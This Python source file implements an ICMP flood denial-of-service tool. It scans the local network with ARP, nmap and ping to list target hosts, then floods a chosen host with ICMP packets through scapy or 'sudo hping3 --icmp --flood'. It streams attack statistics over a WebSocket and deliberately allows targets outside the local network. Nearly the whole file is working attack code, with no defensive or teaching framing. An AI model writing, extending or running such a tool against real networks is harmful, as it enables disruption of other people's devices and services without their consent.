import subprocess
import time
import threading
import socket
import ipaddress
import os
import re
from scapy.all import *
from scapy.layers.inet import IP, ICMP
import json
from datetime import datetime
import asyncio
import netifaces

class ICMPFloodAttack:
    def __init__(self, interface=None, websocket=None, use_hping3=False):
        # Auto-detect interface if not provided
        if interface is None:
            interface = self.auto_detect_interface()
        
        self.interface = interface
        self.websocket = websocket
        self.running = False
        self.target_ip = None
        self.our_ip = None
        self.network_range = None
        self.stats = {
            'packets_sent': 0,
            'packets_per_second': 0,
            'start_time': None,
            'duration': 0,
            'errors': 0,
            'bytes_sent': 0
        }
        self.discovered_clients = []
        self.error_log = []
        self.use_hping3 = use_hping3
        self.hping3_proc = None

    def auto_detect_interface(self):
        """Auto-detect the main network interface (prefer wlan0)"""
        try:
            interfaces = [iface for iface in os.listdir("/sys/class/net") 
                         if iface not in ["lo", "docker0"]]
            
            # Prefer wlan0 if available
            if "wlan0" in interfaces:
                return "wlan0"
            elif interfaces:
                return interfaces[0]
            else:
                raise Exception("No valid network interface found")
        except Exception as e:
            self.error_log.append(f"Interface auto-detection failed: {e}")
            return "wlan0"  # fallback

    def get_interface_ip_range(self, interface):
        """Get the IP range from interface using ip command (like reference script)"""
        try:
            output = subprocess.check_output(f"ip addr show {interface}", 
                                           shell=True, text=True)
            match = re.search(r"inet (\d+\.\d+\.\d+)\.\d+/\d+", output)
            if match:
                base_ip = match.group(1)
                return f"{base_ip}.0/24"
            else:
                raise Exception(f"No IP address found for {interface}")
        except Exception as e:
            self.error_log.append(f"Error getting IP range for {interface}: {e}")
            return None

    def arp_scan_simple(self, ip_range):
        """Simple ARP scan like the reference script"""
        try:
            arp_responses = []
            answered_lst = arping(ip_range, verbose=0)[0]
            for res in answered_lst:
                arp_responses.append({
                    "ip": res[1].psrc, 
                    "mac": res[1].hwsrc,
                    "method": "arp_scan_simple"
                })
            return arp_responses
        except Exception as e:
            self.error_log.append(f"Simple ARP scan failed: {e}")
            return []

    # ADD THIS METHOD ↓↓↓
    def start_attack_bg(self, target_ip, packet_size=64, delay=0.001):
        """Background wrapper for starting the attack"""
        try:
            # Create a new event loop for this thread
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            # Run the attack
            loop.run_until_complete(self.start_attack(target_ip, packet_size, delay))
        except Exception as e:
            print(f"ICMP attack background error: {e}")
            self.error_log.append(f"Background attack error: {e}")
        finally:
            try:
                loop.close()
            except:
                pass

    async def send_status_update(self, message_type, data):
        """Send status update via WebSocket"""
        if self.websocket:
            try:
                message = {
                    'type': message_type,
                    'timestamp': datetime.now().isoformat(),
                    'data': data
                }
                await self.websocket.send_text(json.dumps(message))
            except Exception as e:
                print(f"WebSocket error: {e}")

    
    def check_network_connection(self):
        """Check if interface is connected to AP and has IP"""
        try:
            # Get interface addresses
            addrs = netifaces.ifaddresses(self.interface)
            
            if netifaces.AF_INET not in addrs:
                self.error_log.append(f"No IP address assigned to {self.interface}")
                return False, None, None
            
            ip_info = addrs[netifaces.AF_INET][0]
            our_ip = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calculate network range
            network = ipaddress.IPv4Network(f"{our_ip}/{netmask}", strict=False)
            network_range = str(network)
            
            # Test internet connectivity
            try:
                socket.create_connection(("8.8.8.8", 53), timeout=3)
                internet_ok = True
            except:
                internet_ok = False
            
            # Check if connected to AP (not direct ethernet)
            try:
                result = subprocess.run(['iwconfig', self.interface], 
                                      capture_output=True, text=True)
                if 'ESSID:' in result.stdout and 'Not-Associated' not in result.stdout:
                    connected_to_ap = True
                    # Extract SSID
                    for line in result.stdout.split('\n'):
                        if 'ESSID:' in line:
                            ssid = line.split('ESSID:')[1].strip().strip('"')
                            break
                else:
                    connected_to_ap = False
                    ssid = None
            except:
                connected_to_ap = False
                ssid = None
            
            return True, {
                'our_ip': our_ip,
                'network_range': network_range,
                'netmask': netmask,
                'internet_access': internet_ok,
                'connected_to_ap': connected_to_ap,
                'ssid': ssid
            }
            
        except Exception as e:
            self.error_log.append(f"Network check failed: {e}")
            return False, None
    
    def discover_network_clients(self, network_range=None):
        """Discover clients on the same network using improved ARP scan"""
        try:
            clients = []
            
            # Use provided network range or get from interface
            if network_range is None:
                network_range = self.get_interface_ip_range(self.interface)
                if not network_range:
                    self.error_log.append("Could not determine network range")
                    return []
            
            print(f"[ICMPFlood] Scanning network {network_range} on interface {self.interface}")
            
            # Method 1: Simple ARP scan (like reference script)
            try:
                simple_clients = self.arp_scan_simple(network_range)
                clients.extend(simple_clients)
                print(f"[ICMPFlood] Simple ARP scan found {len(simple_clients)} clients")
            except Exception as e:
                self.error_log.append(f"Simple ARP scan failed: {e}")
            
            # Method 2: Enhanced ARP scan with Scapy
            try:
                answered, unanswered = arping(network_range, timeout=2, verbose=False)
                for sent, received in answered:
                    client_ip = received.psrc
                    client_mac = received.hwsrc
                    
                    # Skip our own IP and gateway, avoid duplicates
                    if (client_ip != self.our_ip and 
                        not client_ip.endswith('.1') and
                        not any(c['ip'] == client_ip for c in clients)):
                        
                        clients.append({
                            'ip': client_ip,
                            'mac': client_mac,
                            'method': 'arp_scan_enhanced'
                        })
                print(f"[ICMPFlood] Enhanced ARP scan found {len([c for c in clients if c['method'] == 'arp_scan_enhanced'])} additional clients")
            except Exception as e:
                self.error_log.append(f"Enhanced ARP scan failed: {e}")
            
            # Method 3: Nmap scan as backup
            try:
                result = subprocess.run(['nmap', '-sn', network_range], 
                                      capture_output=True, text=True, timeout=30)
                
                lines = result.stdout.split('\n')
                current_ip = None
                
                for line in lines:
                    if 'Nmap scan report for' in line:
                        parts = line.split()
                        current_ip = parts[-1].strip('()')
                    elif 'MAC Address:' in line and current_ip:
                        parts = line.split()
                        mac = parts[2]
                        
                        # Skip our IP and gateway, avoid duplicates
                        if (current_ip != self.our_ip and 
                            not current_ip.endswith('.1') and
                            not any(c['ip'] == current_ip for c in clients)):
                            
                            clients.append({
                                'ip': current_ip,
                                'mac': mac,
                                'method': 'nmap_scan'
                            })
                        current_ip = None
                print(f"[ICMPFlood] Nmap scan found {len([c for c in clients if c['method'] == 'nmap_scan'])} additional clients")
            except Exception as e:
                self.error_log.append(f"Nmap scan failed: {e}")
            
            # Test connectivity to discovered clients
            active_clients = []
            for client in clients:
                try:
                    # Quick ping test
                    result = subprocess.run(['ping', '-c', '1', '-W', '1', client['ip']], 
                                          capture_output=True, timeout=3)
                    if result.returncode == 0:
                        client['status'] = 'active'
                        client['response_time'] = self.extract_ping_time(result.stdout.decode())
                        active_clients.append(client)
                    else:
                        client['status'] = 'inactive'
                except:
                    client['status'] = 'unknown'
            
            final_clients = active_clients if active_clients else clients
            print(f"[ICMPFlood] Total clients discovered: {len(final_clients)}")
            return final_clients
            
        except Exception as e:
            self.error_log.append(f"Client discovery failed: {e}")
            return []

    def extract_ping_time(self, ping_output):
        """Extract ping response time from ping output"""
        try:
            for line in ping_output.split('\n'):
                if 'time=' in line:
                    time_part = line.split('time=')[1].split()[0]
                    return float(time_part)
        except:
            pass
        return 0.0
    
    def create_icmp_packet(self, target_ip, packet_size=64):
        """Create ICMP echo request packet"""
        try:
            # Create payload
            payload_size = packet_size - 28  # IP(20) + ICMP(8) = 28 bytes overhead
            payload = b'A' * max(payload_size, 0)
            
            # Create packet
            packet = IP(dst=target_ip) / ICMP() / payload
            return packet
        except Exception as e:
            self.error_log.append(f"Packet creation failed: {e}")
            return None
    
    def flood_target(self, target_ip, packet_size=64, delay=0.001):
        print(f"[ICMPFlood] flood_target started for {target_ip} (packet_size={packet_size}, delay={delay}, use_hping3={self.use_hping3})")
        if self.use_hping3:
            try:
                # Launch hping3 as a subprocess
                cmd = ["sudo", "hping3", "--icmp", "--flood", target_ip, "-I", self.interface]
                print(f"[ICMPFlood] Running: {' '.join(cmd)}")
                self.hping3_proc = subprocess.Popen(cmd)
                while self.running and self.hping3_proc.poll() is None:
                    time.sleep(1)
                if self.hping3_proc.poll() is None:
                    self.hping3_proc.terminate()
                print(f"[ICMPFlood] hping3 process ended.")
            except Exception as e:
                print(f"[ICMPFlood] hping3 error: {e}")
                self.stats['errors'] += 1
                self.error_log.append(f"hping3 error: {e}")
            return
        packet = self.create_icmp_packet(target_ip, packet_size)
        if not packet:
            print("[ICMPFlood] Failed to create packet!")
            return
        
        packet_count = 0
        last_stats_time = time.time()
        
        while self.running:
            try:
                # Send packet
                send(packet, verbose=False)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                packet_count += 1
                if packet_count % 100 == 0:
                    print(f"[ICMPFlood] Sent {self.stats['packets_sent']} packets so far...")
                
                # Update stats every 100 packets
                if packet_count % 100 == 0:
                    current_time = time.time()
                    if self.stats['start_time']:
                        self.stats['duration'] = int(current_time - self.stats['start_time'])
                        if self.stats['duration'] > 0:
                            self.stats['packets_per_second'] = self.stats['packets_sent'] / self.stats['duration']
                    
                    # Send stats update every 2 seconds
                    try:
                        loop = asyncio.get_event_loop()
                        if loop.is_running():
                            asyncio.create_task(self.send_status_update('stats_update', self.get_current_stats()))
                    except RuntimeError:
                        self.error_log.append("No event loop available for status update")
                    last_stats_time = current_time
                
                # Small delay to prevent overwhelming
                if delay > 0:
                    time.sleep(delay)
                
            except Exception as e:
                print(f"[ICMPFlood] Packet send error: {e}")
                self.stats['errors'] += 1
                self.error_log.append(f"Packet send error: {e}")
                time.sleep(0.1)  # Longer delay on error
        print(f"[ICMPFlood] flood_target exiting for {target_ip}")
    
    def get_current_stats(self):
        """Get current attack statistics"""
        if self.stats['start_time']:
            self.stats['duration'] = int(time.time() - self.stats['start_time'])
        
        return {
            'target_ip': self.target_ip,
            'packets_sent': self.stats['packets_sent'],
            'start_time': self.stats['start_time'],
            'duration': self.stats['duration'],
            'errors': self.stats['errors'],
            'packets_per_second': self.stats['packets_sent'] / max(self.stats['duration'], 1),
            'status': 'running' if self.running else 'stopped',
            'running': self.running
        }
    
    async def start_attack(self, target_ip, packet_size=64, delay=0.001):
        """Start ICMP flood attack"""
        try:
            await self.send_status_update('attack_starting', {
                'target_ip': target_ip,
                'packet_size': packet_size
            })
            
            # Check network connection
            network_ok, network_info = self.check_network_connection()
            if not network_ok:
                await self.send_status_update('error', {
                    'message': 'Network connection check failed',
                    'errors': self.error_log
                })
                return False
            
            self.our_ip = network_info['our_ip']
            self.network_range = network_info['network_range']
            
            await self.send_status_update('network_info', network_info)
            
            # Validate target IP is in same network
            try:
                target_network = ipaddress.IPv4Address(target_ip)
                our_network = ipaddress.IPv4Network(self.network_range, strict=False)
                
                if target_network not in our_network:
                    await self.send_status_update('warning', {
                        'message': f'Target {target_ip} is not in local network {self.network_range}. This may still work for external targets.'
                    })
                    # Don't return False - allow external targets
            except Exception as e:
                await self.send_status_update('warning', {
                    'message': f'Could not validate target IP: {e}'
                })
                # Don't return False - continue with attack
            
            # Test target reachability
            try:
                result = subprocess.run(['ping', '-c', '3', '-W', '2', target_ip], 
                                      capture_output=True, timeout=10)
                if result.returncode == 0:
                    response_time = self.extract_ping_time(result.stdout.decode())
                    await self.send_status_update('target_reachable', {
                        'target_ip': target_ip,
                        'response_time': response_time
                    })
                else:
                    await self.send_status_update('warning', {
                        'message': f'Target {target_ip} may not be reachable'
                    })
            except:
                await self.send_status_update('warning', {
                    'message': f'Could not test target reachability'
                })
            
            # Start the attack
            self.target_ip = target_ip
            self.running = True
            self.stats['start_time'] = time.time()
            
            await self.send_status_update('attack_started', {
                'message': 'ICMP flood attack started',
                'target_ip': target_ip,
                'packet_size': packet_size
            })
            
            # Start flooding in separate thread
            flood_thread = threading.Thread(
                target=self.flood_target, 
                args=(target_ip, packet_size, delay),
                daemon=True
            )
            flood_thread.start()
            
            # Send periodic updates
            while self.running:
                await asyncio.sleep(3)
                await self.send_status_update('stats_update', self.get_current_stats())
            
            return True
            
        except Exception as e:
            self.error_log.append(f"Attack start error: {e}")
            await self.send_status_update('error', {
                'message': f'Attack failed to start: {e}',
                'errors': self.error_log
            })
            return False
    
    async def stop_attack(self):
        """Stop ICMP flood attack"""
        self.running = False
        if self.use_hping3 and self.hping3_proc is not None:
            try:
                print("[ICMPFlood] Terminating hping3 process...")
                self.hping3_proc.terminate()
                self.hping3_proc.wait(timeout=3)
                print("[ICMPFlood] hping3 process terminated.")
            except Exception as e:
                print(f"[ICMPFlood] Error terminating hping3: {e}")
                self.error_log.append(f"Error terminating hping3: {e}")
        final_stats = self.get_current_stats()
        await self.send_status_update('attack_stopped', {
            'message': 'ICMP flood attack stopped',
            'final_stats': final_stats,
            'errors': self.error_log if self.error_log else None
        })
        return final_stats
    
    async def discover_clients(self):
        """Discover and return network clients"""
        try:
            await self.send_status_update('discovery_starting', {
                'message': 'Discovering network clients...'
            })
            
            # Check network connection first
            network_ok, network_info = self.check_network_connection()
            if not network_ok:
                await self.send_status_update('error', {
                    'message': 'Network connection check failed',
                    'errors': self.error_log
                })
                return []
            
            self.our_ip = network_info['our_ip']
            self.network_range = network_info['network_range']
            
            await self.send_status_update('network_info', network_info)
            
            # Discover clients
            clients = self.discover_network_clients(self.network_range)
            self.discovered_clients = clients
            
            await self.send_status_update('clients_discovered', {
                'clients': clients,
                'count': len(clients),
                'network_range': self.network_range
            })
            
            return clients
            
        except Exception as e:
            self.error_log.append(f"Client discovery error: {e}")
            await self.send_status_update('error', {
                'message': f'Client discovery failed: {e}',
                'errors': self.error_log
            })
            return []

    def get_targets_for_selection(self):
        """Get targets in a format suitable for user selection (like reference script)"""
        try:
            clients = self.discover_network_clients()
            if not clients:
                return []
            
            # Format like the reference script
            targets = []
            for i, client in enumerate(clients):
                targets.append({
                    'id': i,
                    'ip': client['ip'],
                    'mac': client['mac'],
                    'status': client.get('status', 'unknown'),
                    'response_time': client.get('response_time', 0),
                    'method': client.get('method', 'unknown')
                })
            
            return targets
        except Exception as e:
            self.error_log.append(f"Target selection failed: {e}")
            return []

# Legacy functions for backward compatibility
def arp_scan(ip_range):
    """Legacy ARP scan function"""
    arp_responses = []
    try:
        answered_lst = arping(ip_range, verbose=0)[0]
        for res in answered_lst:
            arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
    except:
        pass
    return arp_responses

def print_arp_res(arp_res):
    """Legacy print function"""
    print("\nID\t\tIP Address\t\tMAC Address")
    print("-" * 50)
    for id, res in enumerate(arp_res):
        print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
    while True:
        try:
            choice = int(input("\nSelect target ID to start ICMP flood (Ctrl+C to exit): "))
            if 0 <= choice < len(arp_res):
                return arp_res[choice]['ip']
        except KeyboardInterrupt:
            print("\nUser exited.")
            exit()
        except:
            print("Invalid choice. Try again.")

def run_hping3(target_ip):
    """Legacy hping3 function"""
    print(f"\nStarting ICMP flood on {target_ip} using hping3...\n")
    try:
        subprocess.run(["sudo", "hping3", "--icmp", "--flood", target_ip])
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        exit()
    except Exception as e:
        print(f"Error running hping3: {e}")
        exit()
